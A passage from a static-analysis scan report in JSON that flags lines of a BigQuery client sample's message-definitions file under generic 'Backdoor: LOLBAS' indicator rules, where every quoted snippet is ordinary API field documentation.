                      "text": "      The values are expected to be encoded using HBase Bytes.toBytes function\n      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n",
                      "markdown": "`      The values are expected to be encoded using HBase Bytes.toBytes function\n      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 43,
                  "endLine": 394,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n      field. If the qualifier is valid UTF-8 string, it can be specified in\n",
                    "rendered": {
                      "text": "    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n      field. If the qualifier is valid UTF-8 string, it can be specified in\n",
                      "markdown": "`    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n      field. If the qualifier is valid UTF-8 string, it can be specified in\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 393,
                  "startColumn": 51,
                  "endLine": 393,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n",
                    "rendered": {
                      "text": "      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n",
                      "markdown": "`      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 392,
                  "startColumn": 72,
                  "endLine": 393,
                  "snippet": {
                    "text": "      must be provided as the column field name and is used as field name in\n      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n",
                    "rendered": {
                      "text": "      must be provided as the column field name and is used as field name in\n      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n",
                      "markdown": "`      must be provided as the column field name and is used as field name in\n      queries.\n    onlyReadLatest: [Optional] If this is set, only the latest version of\n      value in this column are exposed. 'onlyReadLatest' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'onlyReadLatest' is set at both levels.\n    qualifierEncoded: [Required] Qualifier of the column. Columns in the\n      parent column family that has this exact qualifier are exposed as .\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 386,
                  "startColumn": 37,
                  "endLine": 386,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n      must be provided as the column field name and is used as field name in\n",
                    "rendered": {
                      "text": "      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n      must be provided as the column field name and is used as field name in\n",
                      "markdown": "`      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n      must be provided as the column field name and is used as field name in\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 51,
                  "endLine": 385,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n",
                    "rendered": {
                      "text": "      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n",
                      "markdown": "`      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 384,
                  "startColumn": 73,
                  "endLine": 385,
                  "snippet": {
                    "text": "    encoding: [Optional] The encoding of the values when the type is not\n      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n",
                    "rendered": {
                      "text": "    encoding: [Optional] The encoding of the values when the type is not\n      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n",
                      "markdown": "`    encoding: [Optional] The encoding of the values when the type is not\n      STRING. Acceptable encoding values are: TEXT - indicates values are\n      alphanumeric text strings. BINARY - indicates values are encoded using\n      HBase Bytes.toBytes family of functions. 'encoding' can also be set at\n      the column family level. However, the setting at this level takes\n      precedence if 'encoding' is set at both levels.\n    fieldName: [Optional] If the qualifier is not a valid BigQuery field\n      identifier i.e. does not match [a-zA-Z][a-zA-Z0-9_]*, a valid identifier\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 368,
                  "startColumn": 37,
                  "endLine": 369,
                  "snippet": {
                    "text": "    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n",
                    "rendered": {
                      "text": "    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n",
                      "markdown": "`    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 366,
                  "startColumn": 41,
                  "endLine": 367,
                  "snippet": {
                    "text": "\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n",
                      "markdown": "`\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 41,
                  "endLine": 366,
                  "snippet": {
                    "text": "  r\"\"\"A BigqueryTablesUpdateRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n",
                    "rendered": {
                      "text": "  r\"\"\"A BigqueryTablesUpdateRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n",
                      "markdown": "`  r\"\"\"A BigqueryTablesUpdateRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 37,
                  "endLine": 353,
                  "snippet": {
                    "text": "    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n",
                    "rendered": {
                      "text": "    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n",
                      "markdown": "`    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n  datasetId = _messages.StringField(1, required=True)\n  projectId = _messages.StringField(2, required=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 41,
                  "endLine": 351,
                  "snippet": {
                    "text": "\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n",
                      "markdown": "`\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 349,
                  "startColumn": 41,
                  "endLine": 350,
                  "snippet": {
                    "text": "  r\"\"\"A BigqueryTablesPatchRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n",
                    "rendered": {
                      "text": "  r\"\"\"A BigqueryTablesPatchRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n",
                      "markdown": "`  r\"\"\"A BigqueryTablesPatchRequest object.\n\n  Fields:\n    datasetId: Dataset ID of the table to update\n    projectId: Project ID of the table to update\n    table: A Table resource to be passed as the request body.\n    tableId: Table ID of the table to update\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1754,
                  "startColumn": 39,
                  "endLine": 1754,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    friendlyName: [Optional] A descriptive name for this table.\n    id: [Output-only] An opaque ID uniquely identifying the table.\n    kind: [Output-only] The type of the resource.\n    lastModifiedTime: [Output-only] The time when this table was last\n      modified, in milliseconds since the epoch.\n    location: [Output-only] The geographic location where the table resides.\n      This value is inherited from the dataset.\n",
                    "rendered": {
                      "text": "    friendlyName: [Optional] A descriptive name for this table.\n    id: [Output-only] An opaque ID uniquely identifying the table.\n    kind: [Output-only] The type of the resource.\n    lastModifiedTime: [Output-only] The time when this table was last\n      modified, in milliseconds since the epoch.\n    location: [Output-only] The geographic location where the table resides.\n      This value is inherited from the dataset.\n",
                      "markdown": "`    friendlyName: [Optional] A descriptive name for this table.\n    id: [Output-only] An opaque ID uniquely identifying the table.\n    kind: [Output-only] The type of the resource.\n    lastModifiedTime: [Output-only] The time when this table was last\n      modified, in milliseconds since the epoch.\n    location: [Output-only] The geographic location where the table resides.\n      This value is inherited from the dataset.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1743,
                  "startColumn": 34,
                  "endLine": 1743,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n    expirationTime: [Optional] The time when this table expires, in\n      milliseconds since the epoch. If not present, the table will persist\n      indefinitely. Expired tables will be deleted and their storage\n      reclaimed.\n",
                    "rendered": {
                      "text": "      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n    expirationTime: [Optional] The time when this table expires, in\n      milliseconds since the epoch. If not present, the table will persist\n      indefinitely. Expired tables will be deleted and their storage\n      reclaimed.\n",
                      "markdown": "`      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n    expirationTime: [Optional] The time when this table expires, in\n      milliseconds since the epoch. If not present, the table will persist\n      indefinitely. Expired tables will be deleted and their storage\n      reclaimed.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1739,
                  "startColumn": 35,
                  "endLine": 1739,
                  "endColumn": 41,
                  "snippet": {
                    "text": "  r\"\"\"A Table object.\n\n  Fields:\n    creationTime: [Output-only] The time when this table was created, in\n      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n",
                    "rendered": {
                      "text": "  r\"\"\"A Table object.\n\n  Fields:\n    creationTime: [Output-only] The time when this table was created, in\n      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n",
                      "markdown": "`  r\"\"\"A Table object.\n\n  Fields:\n    creationTime: [Output-only] The time when this table was created, in\n      milliseconds since the epoch.\n    description: [Optional] A user-friendly description of this table.\n    etag: [Output-only] A hash of this resource.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 11,
                  "endLine": 1695,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                      "markdown": "`      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1601,
                  "startColumn": 28,
                  "endLine": 1601,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n      results. The default value is 10000 milliseconds (10 seconds).\n",
                    "rendered": {
                      "text": "    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n      results. The default value is 10000 milliseconds (10 seconds).\n",
                      "markdown": "`    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n      results. The default value is 10000 milliseconds (10 seconds).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1600,
                  "startColumn": 15,
                  "endLine": 1600,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      [myProjectId:myDatasetId.myTableId]\".\n    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n",
                    "rendered": {
                      "text": "      [myProjectId:myDatasetId.myTableId]\".\n    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n",
                      "markdown": "`      [myProjectId:myDatasetId.myTableId]\".\n    timeoutMs: [Optional] How long to wait for the query to complete, in\n      milliseconds, before the request times out and returns. Note that this\n      is only a timeout for the request, not the query. If the query takes\n      longer to run than the timeout value, the call returns without any\n      results and with the 'jobComplete' flag set to false. You can call\n      GetQueryResults() to wait for the query to complete and read the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1402,
                  "startColumn": 34,
                  "endLine": 1402,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n    query: [Output-only] Statistics for a query job.\n    startTime: [Output-only] Start time of this job, in milliseconds since the\n      epoch. This field will be present when the job transitions from the\n      PENDING state to either RUNNING or DONE.\n    totalBytesProcessed: [Output-only] [Deprecated] Use the bytes processed in\n",
                    "rendered": {
                      "text": "    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n    query: [Output-only] Statistics for a query job.\n    startTime: [Output-only] Start time of this job, in milliseconds since the\n      epoch. This field will be present when the job transitions from the\n      PENDING state to either RUNNING or DONE.\n    totalBytesProcessed: [Output-only] [Deprecated] Use the bytes processed in\n",
